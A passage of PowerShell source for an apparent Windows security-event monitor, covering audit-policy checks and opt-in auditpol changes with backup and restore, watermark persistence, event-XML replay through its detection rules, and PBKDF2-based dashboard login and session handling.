    $cur = "$($Script:AuditState[$s.ToLower()])"
    $seen += "$s=$cur"
    if (-not $cur -or $cur -eq 'No Auditing') { $blind += $s; continue }
    if ($need -eq 'Success' -and $cur -notmatch 'Success') { $blind += $s; continue }
    if ($need -eq 'Failure' -and $cur -notmatch 'Failure') { $blind += $s }
  }
  if ($blind.Count -gt 0) {
    $detail = "$($blind -join ', ') is not auditing $need - Windows never writes these events, so this rule cannot fire."
    return [PSCustomObject]@{ state = 'blind'; subcategory = ($subs -join ' + '); need = $need; detail = $detail }
  }
  return [PSCustomObject]@{ state = 'ok'; subcategory = ($subs -join ' + '); need = $need; detail = ($seen -join '; ') }
}

# The preflight report the dashboard renders in the coverage panel: which
# families are blind, and the exact auditpol commands that fix them.
function Get-PreflightReport {
  $rules = @(Get-RuleCatalog)
  $blind = @($rules | Where-Object { $_.auditState -eq 'blind' })
  $fix = @()
  foreach ($r in $blind) {
    foreach ($s in @("$($r.auditSubcategory)" -split ' \+ ')) {
      if (-not $s) { continue }
      if ("$($r.auditRequired)" -eq 'Failure') { $fix += 'auditpol /set /subcategory:"' + $s + '" /failure:enable' }
      else { $fix += 'auditpol /set /subcategory:"' + $s + '" /success:enable' }
    }
  }
  return [PSCustomObject]@{
    ok            = $true
    checkedAt     = $Script:AuditCheckedAt
    readable      = ($null -ne $Script:AuditState)
    policyCount   = if ($Script:AuditState) { @($Script:AuditState.Keys).Count } else { 0 }
    rulesTotal    = $rules.Count
    okCount       = @($rules | Where-Object { $_.auditState -eq 'ok' }).Count
    blindCount    = $blind.Count
    naCount       = @($rules | Where-Object { $_.auditState -eq 'n/a' }).Count
    unknownCount  = @($rules | Where-Object { $_.auditState -eq 'unknown' }).Count
    blind         = @($blind | ForEach-Object { [PSCustomObject]@{ key = $_.key; title = $_.title; subcategory = $_.auditSubcategory; need = $_.auditRequired; detail = $_.auditDetail } })
    fix           = @($fix | Select-Object -Unique)
  }
}

# ============================================================
# AUDIT-POLICY SETUP (opt-in) - enable what the rules need, safely
# ============================================================
# Pasting "auditpol /set /subcategory:"User Account Management" ..." into
# PowerShell FAILS: PowerShell strips the inner quotes, auditpol sees
# /subcategory:User and prints its help text. The invocation below passes the
# whole "/subcategory:<name>" as ONE argument, which reaches auditpol intact
# (and works on non-English Windows too, via the subcategory GUID when the
# name-to-GUID map is available).

function Get-AuditSubcategoryGuids {
  # auditpol /list /subcategory:* /v maps name -> GUID on THIS box; a GUID
  # sidesteps any localisation of the subcategory names
  $map = @{}
  try {
    $raw = & auditpol.exe /list /subcategory:* /v 2>$null
    foreach ($line in @($raw)) {
      # "  Logon                        {0CCE9215-69AE-11D9-BED3-505054503030}"
      if ("$line" -match '^\s*(?<name>\S.*?)\s{2,}(?<guid>\{[0-9A-Fa-f-]+\})') {
        $map[$Matches['name'].Trim().ToLower()] = $Matches['guid']
      }
    }
  } catch { }
  return $map
}

function Invoke-AuditpolSet([string]$SubArg, [string]$Flag) {
  # SubArg arrives as "/subcategory:Logon" or "/subcategory:{guid}": ONE
  # string. PowerShell passes it to auditpol.exe verbatim - the quotes inside
  # it survive, unlike a hand-pasted command line.
  & auditpol.exe /set $SubArg $Flag
  return ($LASTEXITCODE -eq 0)
}

function Test-SentinelIsAdmin {
  # The role check throws on non-Windows (the suite's host); there the answer is
  # simply 'no', which is also what a non-elevated console should hear.
  try {
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($id)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
  } catch {
    return $false
  }
}

# The exact changes -EnableAudit would make, WITHOUT making them: the wanted
# set the real function computes, as rows for /api/audit/preview and for the
# UI's confirm dialog.
function Get-AuditChangePreview {
  # The suite seeds $Script:AuditState directly (there is no auditpol on the
  # test host); $Script:AuditStateTestSeed says 'already seeded, do not re-read'.
  if (-not $Script:AuditStateTestSeed) { $null = Update-AuditPreflight }
  $changes = @()
  if ($null -eq $Script:AuditState) { return @() }
  $rules = @(Get-RuleCatalog)
  $wanted = @{}
  foreach ($r in $rules) {
    if ($r.auditState -eq 'n/a' -or $r.auditState -eq 'ok') { continue }
    foreach ($sub in @("$($r.auditSubcategory)" -split ' \+ ')) {
      if (-not $sub) { continue }
      $cur = "$($Script:AuditState[$sub.ToLower()])"
      if ($cur -eq '') { $cur = 'No Auditing' }
      $need = "$($r.auditRequired)"
      $flags = @()
      if ($need -match 'Success' -and $cur -notmatch 'Success') { $flags += 'success' }
      if ($need -match 'Failure' -and $cur -notmatch 'Failure') { $flags += 'failure' }
      if ($flags.Count -eq 0) { continue }
      if (-not $wanted.ContainsKey($sub)) {
        $wanted[$sub] = @{ before = $cur; flags = @(); rules = @() }
      }
      foreach ($f in $flags) {
        if ($wanted[$sub].flags -notcontains $f) { $wanted[$sub].flags += $f }
      }
      $wanted[$sub].rules += $r.key
    }
  }
  foreach ($sub in $wanted.Keys) {
    $changes += [PSCustomObject]@{
      subcategory = $sub
      before      = "$($wanted[$sub].before)"
      after       = (Get-AuditAfterLabel "$($wanted[$sub].before)" @($wanted[$sub].flags | Select-Object -Unique))
      flags       = @($wanted[$sub].flags | Select-Object -Unique)
      rules       = @($wanted[$sub].rules | Select-Object -Unique)
    }
  }
  return @($changes | Sort-Object subcategory)
}

# Computes the 'after' cell for a preview row from the flags it will enable.
function Get-AuditAfterLabel([string]$Before, [string[]]$Flags) {
  $after = "$Before"
  foreach ($f in @($Flags)) {
    if ($f -eq 'success' -and $after -notmatch 'Success') { $after = if ($after -eq 'No Auditing' -or $after -eq '') { 'Success' } else { 'Success and Failure' } }
    if ($f -eq 'failure' -and $after -notmatch 'Failure') { $after = if ($after -eq 'No Auditing' -or $after -eq '') { 'Failure' } else { 'Success and Failure' } }
  }
  return $after
}

# Backup files THIS TOOL created (sentinel-audit-backup-*.csv beside the
# script), by NAME only - the restore path accepts one of these names, never a
# path.
function Get-AuditBackups {
  $names = @()
  try {
    $files = @(Get-ChildItem -Path $PSScriptRoot -Filter 'sentinel-audit-backup-*.csv' -File -ErrorAction SilentlyContinue |
      Sort-Object LastWriteTimeUtc -Descending)
    foreach ($f in $files) { $names += $f.Name }
  } catch { }
  return @($names)
}

function Test-ProcessElevated {
  return (Test-SentinelIsAdmin)
}

function Enable-SentinelAuditPolicy {
  # requires Administrator - auditpol /set fails without it, and half-applied
  # audit policies are worse than none
  if (-not (Test-SentinelIsAdmin)) {
    Write-Host "  [audit] NOT ENABLED - enabling the audit policy requires Administrator." -ForegroundColor Red
    return $false
  }
  $null = Update-AuditPreflight
  if ($null -eq $Script:AuditState) {
    Write-Host "  [audit] the audit policy could not be read - nothing to enable (run as Administrator)." -ForegroundColor Red
    return $false
  }
  # 1. BACKUP FIRST, always, before anything changes
  $stamp = (Get-Date).ToString("yyyyMMdd-HHmmss")
  $backup = Join-Path $PSScriptRoot ("sentinel-audit-backup-" + $stamp + ".csv")
  try {
    & auditpol.exe /backup /file:$backup | Out-Null
    Write-Host ("  [audit] backup written: " + $backup) -ForegroundColor Green
  } catch {
    Write-Host "  [audit] NOT ENABLED - the pre-change backup failed; nothing was modified." -ForegroundColor Red
    return $false
  }
  # 2. what to change: every subcategory a rule needs that is not already set
  $guids = Get-AuditSubcategoryGuids
  $rules = @(Get-RuleCatalog)
  $wanted = @{}   # subcategory -> flag ('/success:enable' and/or '/failure:enable')
  foreach ($r in $rules) {
    if ($r.auditState -eq 'n/a' -or $r.auditState -eq 'ok') { continue }
    foreach ($sub in @("$($r.auditSubcategory)" -split ' \+ ')) {
      if (-not $sub) { continue }
      $cur = "$($Script:AuditState[$sub.ToLower()])"
      $need = "$($r.auditRequired)"
      if ($need -match 'Success' -and $cur -notmatch 'Success') {
        if (-not $wanted.ContainsKey($sub)) { $wanted[$sub] = @() }
        $wanted[$sub] += '/success:enable'
      }
      if ($need -match 'Failure' -and $cur -notmatch 'Failure') {
        if (-not $wanted.ContainsKey($sub)) { $wanted[$sub] = @() }
        $wanted[$sub] += '/failure:enable'
      }
    }
  }
  if ($wanted.Count -eq 0) {
    Write-Host "  [audit] nothing to change - every subcategory the rules need is already enabled." -ForegroundColor Green
    return $true
  }
  # 3. change, one subcategory at a time, never turning anything off
  $changed = 0
  $changedBy = if ($Script:AuditChangeCaller) { $Script:AuditChangeCaller } else { 'console (-EnableAudit)' }
  Write-Host ""
  Write-Host "  subcategory                          | before               | after"
  Write-Host "  -------------------------------------+----------------------+----------------------"
  foreach ($sub in ($wanted.Keys | Sort-Object)) {
    $cur = "$($Script:AuditState[$sub.ToLower()])"
    if ($cur -eq '' -or $cur -eq 'No Auditing') { $cur = 'No Auditing' }
    $flags = @($wanted[$sub] | Select-Object -Unique)
    $after = $cur
    foreach ($f in $flags) {
      # prefer the GUID: immune to localised subcategory names
      $subArg = "/subcategory:$sub"
      if ($guids.ContainsKey($sub.ToLower())) { $subArg = "/subcategory:$($guids[$sub.ToLower()])" }
      if (Invoke-AuditpolSet $subArg $f) {
        if ($f -eq '/success:enable' -and $after -notmatch 'Success') { if ($after -eq 'No Auditing') { $after = 'Success' } else { $after = "$after and Success" } }
        if ($f -eq '/failure:enable' -and $after -notmatch 'Failure') { if ($after -eq 'No Auditing') { $after = 'Failure' } else { $after = "$after and Failure" } }
      } else {
        Write-Host ("  [audit] auditpol refused: " + $sub + " " + $f) -ForegroundColor Red
      }
    }
    Write-Host ("  " + $sub.PadRight(37) + "| " + $cur.PadRight(20) + "| " + $after)
    Write-AuditChange $sub $cur $after $backup
    $changed++
    if ($Script:AuditChangeCaller) {
      Write-AuthEvent $Script:AuditChangeCallerIp $Script:AuditChangeCaller 'success' ("audit policy set: " + $sub + " -> " + $after)
    }
  }
  Write-Host ("  [audit] " + $changed + " subcategory(ies) updated (only enabled; nothing was ever turned off).") -ForegroundColor Green
  # 4. re-read so coverage and health update immediately, no restart
  $null = Update-AuditPreflight
  return $true
}

# The UI entry point for Settings > Audit: same code as -EnableAudit, but the
# caller is the signed-in dashboard user (who re-authenticated to get here).
function Invoke-AuditPolicyApply([string]$CallerName, [string]$CallerIp) {
  $Script:AuditChangeCaller = $CallerName
  $Script:AuditChangeCallerIp = $CallerIp
  try {
    return (Enable-SentinelAuditPolicy)
  } finally {
    $Script:AuditChangeCaller = $null
    $Script:AuditChangeCallerIp = $null
  }
}

function Restore-SentinelAuditPolicy([string]$BackupFile) {
  if (-not (Test-SentinelIsAdmin)) {
    Write-Host "  [audit] RESTORE REFUSED - restoring the audit policy requires Administrator." -ForegroundColor Red
    return $false
  }
  if (-not $BackupFile -or -not (Test-Path $BackupFile)) {
    Write-Host ("  [audit] RESTORE REFUSED - backup file not found: " + $BackupFile) -ForegroundColor Red
    return $false
  }
  & auditpol.exe /restore /file:$BackupFile
  if ($LASTEXITCODE -eq 0) {
    Write-Host ("  [audit] policy restored from " + $BackupFile) -ForegroundColor Green
    $null = Update-AuditPreflight
    return $true
  }
  Write-Host "  [audit] auditpol /restore failed - see its output above." -ForegroundColor Red
  return $false
}

# ============================================================
# RUNTIME STATE - the poll watermark survives a restart
# ============================================================
# The old build hardcoded a 2-minute backfill on every start: restarting
# re-alerted the last two minutes (duplicates) and still lost everything written
# while the monitor was down (gap). The watermark is written on every poll now.
# A channel name is not a valid JSON-friendly property name on its own
# ("Microsoft-Windows-Windows Defender/Operational"), so marks are stored under a
# sanitised key.
function ConvertTo-StateKey([string]$Channel) {
  return ("$Channel" -replace '[^A-Za-z0-9]', '_')
}

function Save-State {
  try {
    $channels = @{}
    foreach ($c in @($Script:ChannelMarks.Keys)) {
      $channels[(ConvertTo-StateKey $c)] = $Script:ChannelMarks[$c].ToUniversalTime().ToString("o")
    }
    @{
      savedAt   = (Get-Date).ToUniversalTime().ToString("o")
      lastCheck = $Script:LastCheck.ToUniversalTime().ToString("o")
      channels  = $channels
      forwarded = $Script:Forwarded
    } | ConvertTo-Json -Depth 4 | Set-Content -Path $StateFile -Encoding UTF8 -Force
  } catch { }
}

# Restores one watermark per channel, so a restart resumes each channel exactly
# where it stopped instead of re-alerting the last two minutes (duplicates) or
# skipping the downtime (gap). A v2.1 state file with a single global watermark
# is still accepted.
function Restore-State {
  if (-not (Test-Path $StateFile)) { return $false }
  try {
    $saved = Get-Content -Raw $StateFile | ConvertFrom-Json
    $restored = $false

    if ($saved.channels) {
      foreach ($key in @($saved.channels.PSObject.Properties.Name)) {
        $value = "$($saved.channels.$key)"
        if (-not $value) { continue }
        foreach ($source in $LogSources) {
          if ((ConvertTo-StateKey $source.Log) -eq $key) {
            $Script:ChannelMarks[$source.Log] = ([datetime]$value).ToLocalTime()
            $restored = $true
          }
        }
      }
    }

    if (-not $restored -and $saved.lastCheck) {
      $dt = ([datetime]$saved.lastCheck).ToLocalTime()
      foreach ($source in $LogSources) { $Script:ChannelMarks[$source.Log] = $dt }
      $restored = $true
    }

    if ($restored) {
      $Script:LastCheck = ($Script:ChannelMarks.Values | Sort-Object)[0]
      $gap = (Get-Date) - $Script:LastCheck
      if ($gap.TotalMinutes -gt 2) {
        Write-Host ("  [state] resuming from " + $Script:LastCheck.ToString("u") + " - " + [int]$gap.TotalMinutes + " minute(s) of downtime will be polled.") -ForegroundColor Yellow
      } else {
        Write-Host ("  [state] resuming from " + $Script:LastCheck.ToString("u")) -ForegroundColor DarkGray
      }
      return $true
    }
  } catch { }
  return $false
}

# ============================================================
# EVENT REPLAY - run exported event XML through the real rule engine
# ============================================================
# The synthetic self-test proves the THRESHOLDS work, but it cannot catch a
# field-shape bug - matching ObjectType when the data really lives in
# Properties, or reading a channel that never carries the event - because the
# probe invents the field names too. Replaying real exported events does catch
# those, which is exactly how the DCSync and 1100-channel bugs were found:
#
#   wevtutil epl Security C:\evt\security.evtx
#   wevtutil qe C:\evt\security.evtx /f:xml /c:1000 > C:\evt\security.xml
#   .\AlphaSentinel.ps1 -ReplayPath C:\evt\security.xml
#
# Accepts one XML file (one or many <Event> elements, bare or wrapped in
# <Events>) or a directory of them. Replay does NOT touch the live alert store,
# the history file or the dedupe windows of a running monitor.
function New-EventShimFromXml($node) {
  $id = 0
  $el = $node.SelectSingleNode('.//*[local-name()="EventID"]')
  if ($el) { [void][int]::TryParse($el.InnerText, [ref]$id) }
  $machine = "$env:COMPUTERNAME"
  $el = $node.SelectSingleNode('.//*[local-name()="Computer"]')
  if ($el -and $el.InnerText) { $machine = $el.InnerText }
  $recId = 0
  $el = $node.SelectSingleNode('.//*[local-name()="EventRecordID"]')
  if ($el) { [void][int]::TryParse($el.InnerText, [ref]$recId) }
  $xmlText = $node.OuterXml

  $shim = New-Object PSObject
  $shim | Add-Member -MemberType NoteProperty -Name Id -Value $id -Force
  $shim | Add-Member -MemberType NoteProperty -Name Machine -Value $machine -Force
  $shim | Add-Member -MemberType NoteProperty -Name RecordId -Value $recId -Force
  $shim | Add-Member -MemberType ScriptProperty -Name XmlObj -Value ({ return $xmlText }.GetNewClosure()) -Force
  $shim | Add-Member -MemberType ScriptMethod -Name ToXml -Value { return $this.XmlObj } -Force
  return $shim
}

function Get-ReplayShims($path) {
  $files = @()
  if (Test-Path -Path $path -PathType Container) {
    $files = @(Get-ChildItem -Path $path -Filter *.xml -File -ErrorAction SilentlyContinue | Sort-Object Name)
  } elseif (Test-Path -Path $path) {
    $files = @(Get-Item -Path $path)
  }
  foreach ($file in $files) {
    $doc = New-Object System.Xml.XmlDocument
    $loaded = $true
    try { $doc.Load($file.FullName) } catch { Write-Warning "could not parse $($file.Name): $_"; $loaded = $false }
    if (-not $loaded) { continue }
    foreach ($n in @($doc.SelectNodes('//*[local-name()="Event"]'))) {
      $t = $null
      $el = $n.SelectSingleNode('.//*[local-name()="TimeCreated"]')
      if ($el -and $el.GetAttribute('SystemTime')) {
        try { $t = [datetime]::Parse($el.GetAttribute('SystemTime')).ToUniversalTime() } catch { $t = $null }
      }
      [PSCustomObject]@{ Shim = (New-EventShimFromXml $n); Time = $t; Source = $file.Name }
    }
  }
}

function Invoke-Replay($path) {
  $entries = @(Get-ReplayShims $path)
  if ($entries.Count -eq 0) {
    Write-Warning "No <Event> elements found at $path (expected wevtutil /f:xml output)."
    return
  }
  $alerts = @()
  $processed = 0
  # oldest-first, exactly like the live loop, so thresholds see events in time order
  foreach ($en in @($entries | Sort-Object Time)) {
    $processed++
    $alert = Evaluate-Event $en.Shim
    if ($alert) {
      $alerts += [PSCustomObject]@{
        Time     = $alert.Time
        Severity = $alert.Severity
        RuleKey  = $alert.RuleKey
        EventId  = $alert.EventId
        Account  = $alert.Account
        Host     = $alert.Host
        Source   = $en.Source
        Detail   = $alert.Description
      }
    }
  }

  Write-Host ""
  Write-Host "  ============================================================" -ForegroundColor Red
  Write-Host ("   REPLAY REPORT - " + $processed + " event(s) from " + $path) -ForegroundColor Red
  Write-Host "  ============================================================" -ForegroundColor Red
  if ($alerts.Count -eq 0) {
    Write-Host "   No alerts. Either the events are all benign, or the rule that" -ForegroundColor Yellow
    Write-Host "   should catch them is reading the wrong field / channel - check" -ForegroundColor Yellow
    Write-Host "   the field names against the real XML above." -ForegroundColor Yellow
  } else {
    Write-Host ("   " + $alerts.Count + " alert(s) would fire:") -ForegroundColor Green
    Write-Host ""
    foreach ($a in $alerts) {
      Write-Host ("   [" + $a.Severity.PadRight(8) + "] " + $a.RuleKey + "  (event " + $a.EventId + ")") -ForegroundColor Green
      Write-Host ("        " + $a.Detail)
    }
    Write-Host ""
    Write-Host "   By rule:" -ForegroundColor DarkGray
    foreach ($g in @($alerts | Group-Object RuleKey | Sort-Object Count -Descending)) {
      Write-Host ("     " + $g.Count.ToString().PadLeft(4) + "  " + $g.Name) -ForegroundColor DarkGray
    }
    $out = [IO.Path]::ChangeExtension($path, ".alerts.csv")
    if (Test-Path -Path $path -PathType Container) { $out = Join-Path $path "replay-alerts.csv" }
    try {
      $alerts | Export-Csv -Path $out -NoTypeInformation -Force -Encoding UTF8
      Write-Host ""
      Write-Host ("   Full report written to " + $out) -ForegroundColor DarkGray
    } catch { }
  }
  Write-Host ""
}

# ============================================================
# AUTHENTICATION - local accounts, PBKDF2 hashes, server-side sessions
# ============================================================
# v2.1 protected the dashboard with a per-run token that was injected into the
# page the server sent, so anyone who could open the port received the token
# with the page - and "sign in" was really "can you reach this port". This is a
# real login instead:
#   * accounts live in sentinel-users.json, PBKDF2-hashed (per-user 16-byte
#     salt, >= 100000 iterations), created by New-SentinelAdmin.ps1
#   * POST /api/login verifies the password and mints a server-side session
#   * the browser only ever holds an opaque session id in an HttpOnly cookie
#   * failed logins are rate-limited per source IP and audited
#
# The record format below (algorithm, salt, iterations, hash encoding) is SHARED
# with New-SentinelAdmin.ps1 - change one and you must change the other. The
# test suite cross-checks that a hash written by the admin tool verifies here.

$Script:SessionHours = 8        # absolute session lifetime
$Script:IdleMinutes = 30        # sliding idle timeout
$Script:MaxLoginFailures = 5    # failed logins per source IP ...
$Script:LoginWindowMinutes = 5  # ... inside this window, before ...
$Script:LoginBlockMinutes = 5   # ... the IP is blocked for this long
$Script:Pbkdf2Iterations = 150000

$Script:Sessions = @{}          # sessionId -> @{ User; Created; LastSeen; UserStamp }
$Script:LoginFailures = @{}     # ip -> @{ Count; First; BlockedUntil }

# Users-file fingerprint. The account store is edited out-of-band by
# New-SentinelAdmin.ps1, so a live session has to be re-checked against it: a
# session must not outlive its account, and a password reset must invalidate the
# sessions that were opened with the old password.
$Script:UsersStamp = $null      # last seen LastWriteTimeUtc of the users file
$Script:UsersUpdated = @{}      # user -> its 'updated' timestamp
$Script:UsersRevoked = 0        # sessions ended because the account changed

function ConvertTo-Hex([byte[]]$Bytes) {
  return (($Bytes | ForEach-Object { $_.ToString('x2') }) -join '')
}

function ConvertFrom-Hex([string]$Hex) {
  if (-not $Hex) { return $null }
  $clean = "$Hex" -replace '[^0-9a-fA-F]', ''
  if ($clean.Length -eq 0 -or ($clean.Length % 2) -ne 0) { return $null }
  $bytes = New-Object byte[] ($clean.Length / 2)
  for ($i = 0; $i -lt $bytes.Length; $i++) {
    $bytes[$i] = [Convert]::ToByte($clean.Substring($i * 2, 2), 16)
  }
  return $bytes
}

# PBKDF2-HMAC-SHA1 via Rfc2898DeriveBytes. This overload - (string, byte[],
# int) - is the one that exists on .NET 4.x; the HashAlgorithmName overloads
# need .NET 4.7.2+ and would throw on Server 2012 R2.
function Get-PasswordHash([string]$Password, [byte[]]$Salt, [int]$Iterations) {
  # New-Object rather than [Type]::new(): ::new() is PowerShell 5.0+ syntax and
  # this has to run on anything from 5.1 up. The constructor is the
  # (string, byte[], int) overload that exists on .NET 4.x, and the explicit casts
  # keep overload resolution unambiguous. The test suite pins the output against
  # the published RFC 6070 vectors, so the construction is verified, not assumed.
  $kdf = New-Object -TypeName System.Security.Cryptography.Rfc2898DeriveBytes -ArgumentList @([string]$Password, [byte[]]$Salt, [int]$Iterations)
  try { return $kdf.GetBytes(32) } finally { $kdf.Dispose() }
}

function New-PasswordSalt {
  $salt = New-Object byte[] 16
  $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
  try { $rng.GetBytes($salt) } finally { $rng.Dispose() }
  return $salt
}

# Constant-time comparison: every byte is always touched, so the time taken does
# not depend on how many leading bytes matched. The length check leaks only the
# length, which is not secret.
function Test-FixedTimeEquals([byte[]]$A, [byte[]]$B) {
  if ($null -eq $A -or $null -eq $B) { return $false }
  if ($A.Length -ne $B.Length) { return $false }
  $diff = 0
  for ($i = 0; $i -lt $A.Length; $i++) { $diff = $diff -bor ($A[$i] -bxor $B[$i]) }
  return ($diff -eq 0)
}

function Get-UserStore {
  if (-not (Test-Path $UsersFile)) { return $null }
  try {
    $raw = Get-Content -Raw $UsersFile
    if (-not $raw) { return $null }
    return ($raw | ConvertFrom-Json)
  } catch { return $null }
}

# Writes the users store the way New-SentinelAdmin.ps1 does: ASCII content,
# UTF-8 with BOM, one WriteAllText (atomic enough for this file's size and the
# same encoding every reader expects).
function Save-UserStore($Store) {
  $json = $Store | ConvertTo-Json -Depth 5
  $utf8Bom = New-Object System.Text.UTF8Encoding($true)
  [System.IO.File]::WriteAllText($UsersFile, $json, $utf8Bom)
  $null = Update-UsersFingerprint   # so Revoke-StaleSessions sees the new stamps
}

# Rewrites one user record with a fresh salt/hash (the v2.5 iteration count) and
# a new 'updated' stamp; keeps the original 'created'.
function Set-UserPassword([string]$UserName, [string]$PlainText, [int]$Iterations) {
  $store = Get-UserStore
  if (-not $store -or -not $store.users) { return $null }
  $record = Get-UserRecord $store $UserName
  if (-not $record) { return $null }
  $salt = New-PasswordSalt
  $hash = Get-PasswordHash $PlainText $salt $Iterations
  $now = (Get-Date).ToUniversalTime().ToString("o")
  $users = @()
  foreach ($u in @($store.users)) {
    if ("$($u.user)" -eq $UserName) {
      $users += [PSCustomObject]@{
        user       = "$($u.user)"
        salt       = (ConvertTo-Hex $salt)
        hash       = (ConvertTo-Hex $hash)
        iterations = $Iterations
        created    = if ("$($u.created)") { "$($u.created)" } else { $now }
        updated    = $now
        avatarColor = if ($u.avatarColor) { "$($u.avatarColor)" } else { '' }
        avatarInitials = if ($u.avatarInitials) { "$($u.avatarInitials)" } else { '' }
      }
    } else {
      $users += $u
    }
  }
  Save-UserStore ([PSCustomObject]@{ version = 1; users = $users })
  return $now
}

# Rewrites the user's NAME (Settings > Account). Sessions of the old name are
# ended by the caller; the caller's own session is re-stamped below.
function Rename-User([string]$OldName, [string]$NewName) {
  $store = Get-UserStore
  if (-not $store -or -not $store.users) { return $null }
  $now = (Get-Date).ToUniversalTime().ToString("o")
  $users = @()
  foreach ($u in @($store.users)) {
    if ("$($u.user)" -eq $OldName) {
      $users += [PSCustomObject]@{
        user       = $NewName
        salt       = "$($u.salt)"
        hash       = "$($u.hash)"
        iterations = [int]$u.iterations
        created    = "$($u.created)"
        updated    = $now
        avatarColor = if ($u.avatarColor) { "$($u.avatarColor)" } else { '' }
        avatarInitials = if ($u.avatarInitials) { "$($u.avatarInitials)" } else { '' }
      }
    } else {
      $users += $u
    }
  }
  Save-UserStore ([PSCustomObject]@{ version = 1; users = $users })
  return $now
}

# Adds a user (Settings > Users). The password arrives from the form; it is
# hashed here and never stored or logged.
function Add-User([string]$Name, [string]$PlainText) {
  $store = Get-UserStore
  if (-not $store) { $store = [PSCustomObject]@{ version = 1; users = @() } }
  $salt = New-PasswordSalt
  $hash = Get-PasswordHash $PlainText $salt $Script:Pbkdf2Iterations
  $now = (Get-Date).ToUniversalTime().ToString("o")
  $users = @(@($store.users))
  $users += [PSCustomObject]@{
    user = $Name; salt = (ConvertTo-Hex $salt); hash = (ConvertTo-Hex $hash)
    iterations = $Script:Pbkdf2Iterations; created = $now; updated = $now
    avatarColor = ''; avatarInitials = ''
  }
  Save-UserStore ([PSCustomObject]@{ version = 1; users = $users })
  return $now
}

# Removes a user record. The caller has already refused the last-user and
# self-removal cases.
function Remove-UserRecord([string]$Name) {
  $store = Get-UserStore
  if (-not $store -or -not $store.users) { return $false }
  $kept = @(@($store.users) | Where-Object { "$($_.user)" -ne $Name })
  if (@($kept).Count -eq @($store.users).Count) { return $false }
  Save-UserStore ([PSCustomObject]@{ version = 1; users = $kept })
  return $true
}

# Ends every session belonging to one user (all the user-change routes do this,
# so a removed or rewritten account is signed out on the very next request).
function Revoke-UserSessions([string]$UserName) {
  $dropped = 0
  foreach ($id in @($Script:Sessions.Keys)) {
    if ("$($Script:Sessions[$id].User)" -eq $UserName) {
      $Script:Sessions.Remove($id)
      $dropped++
    }
  }
  return $dropped
}

# Rotates the CALLER's session: same account, brand-new id (a password change
# should not sign the person who just changed it out of the tab they are in,
# but the old cookie must stop working).
function Rotate-Session([string]$OldSessionId, [string]$UserName) {
  $new = New-Session $UserName
  Remove-Session $OldSessionId
  return $new
}

# The fixed avatar palette (Settings > Account): keys, never free-form CSS.
$Script:AvatarPalette = @('crimson', 'ember', 'amber', 'moss', 'teal', 'azure', 'violet', 'slate')

function Test-AvatarColor([string]$Key) {
  return ($Script:AvatarPalette -contains "$Key")
}

function Test-AvatarInitials([string]$Initials) {
  return ("$Initials" -match '^[A-Z0-9]{1,2}$')
}

# Sets the avatar fields on one user record (no file upload, by design).
function Set-UserAvatar([string]$UserName, [string]$Color, [string]$Initials) {
  $store = Get-UserStore
  if (-not $store -or -not $store.users) { return $null }
  $now = (Get-Date).ToUniversalTime().ToString("o")
  $users = @()
  foreach ($u in @($store.users)) {
    if ("$($u.user)" -eq $UserName) {
      $users += [PSCustomObject]@{
        user = "$($u.user)"; salt = "$($u.salt)"; hash = "$($u.hash)"
        iterations = [int]$u.iterations
        created = "$($u.created)"
        updated = $now
        avatarColor = $Color; avatarInitials = $Initials
      }
    } else { $users += $u }
  }
  Save-UserStore ([PSCustomObject]@{ version = 1; users = $users })
  return $now
}

# /api/users: names and dates only - never a hash, salt or iteration count.
function Get-UsersPayload([string]$CurrentUser) {
  $store = Get-UserStore
  $rows = @()
  if ($store -and $store.users) {
    foreach ($u in @($store.users)) {
      $created = "$($u.created)"
      $updated = "$($u.updated)"
      try { $created = ([datetime]$u.created).ToUniversalTime().ToString("o") } catch { }
      try { $updated = ([datetime]$u.updated).ToUniversalTime().ToString("o") } catch { }
      $rows += [PSCustomObject]@{
        name    = "$($u.user)"
        created = $created
        updated = $updated
        current = ("$($u.user)" -eq $CurrentUser)
        avatarColor    = if ($u.avatarColor) { "$($u.avatarColor)" } else { '' }
        avatarInitials = if ($u.avatarInitials) { "$($u.avatarInitials)" } else { '' }
      }
    }
  }
  return @($rows)
}

function Get-UserRecord($store, [string]$UserName) {
  if (-not $store -or -not $store.users -or -not $UserName) { return $null }
  foreach ($u in @($store.users)) {
    if ("$($u.user)" -eq $UserName) { return $u }
  }
  return $null
}

# Verifies a password against one user record. Every failure path (unknown user,
# unreadable record, wrong password) returns $false having done a comparable
# amount of hashing, so the response time does not reveal whether the username
# exists.
function Test-UserPassword([string]$UserName, [string]$Password) {
  $store = Get-UserStore
  $record = Get-UserRecord $store $UserName
  $salt = New-PasswordSalt                 # dummy salt on the unknown-user path
  $iterations = $Script:Pbkdf2Iterations
  $expected = $null
  if ($record) {
    $rs = ConvertFrom-Hex "$($record.salt)"
    if ($rs) { $salt = $rs }
    $rh = ConvertFrom-Hex "$($record.hash)"
    if ($rh) { $expected = $rh }
    $ri = 0
    [void][int]::TryParse("$($record.iterations)", [ref]$ri)
    if ($ri -ge 1000) { $iterations = $ri }
  }
  $actual = Get-PasswordHash $Password $salt $iterations
  if (-not $expected) { return $false }
  return (Test-FixedTimeEquals $actual $expected)
}

# Does the web UI have anything to authenticate against? Called at startup:
# without this the dashboard would either be an open port or dead, so it is
# checked before the listener is created.
function Get-UsersFileState {
  if (-not (Test-Path $UsersFile)) {
    return [PSCustomObject]@{
      ok      = $false
      reason  = 'missing'
      message = "no user database at $UsersFile, so the dashboard will NOT be served. Create the first account with:  .\New-SentinelAdmin.ps1   (or -Username <name> for your own). Monitoring, alerting and forwarding continue without the dashboard."
    }
  }
  $store = Get-UserStore
  if (-not $store -or -not $store.users -or @($store.users).Count -eq 0) {
    return [PSCustomObject]@{
      ok      = $false
      reason  = 'empty'
      message = "$UsersFile has no users in it, so the dashboard will NOT be served. Add one with:  .\New-SentinelAdmin.ps1 -Username <name>"
    }
  }
  return [PSCustomObject]@{ ok = $true; reason = 'ok'; message = "$(@($store.users).Count) user(s) in $UsersFile" }
}

# ---- sessions -------------------------------------------------------------
function New-SessionId {
  $bytes = New-Object byte[] 32          # 32 random bytes, hex -> 256 bits
  $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
  try { $rng.GetBytes($bytes) } finally { $rng.Dispose() }
  return (ConvertTo-Hex $bytes)
}

function New-Session([string]$UserName) {
  $id = New-SessionId
  $now = Get-Date
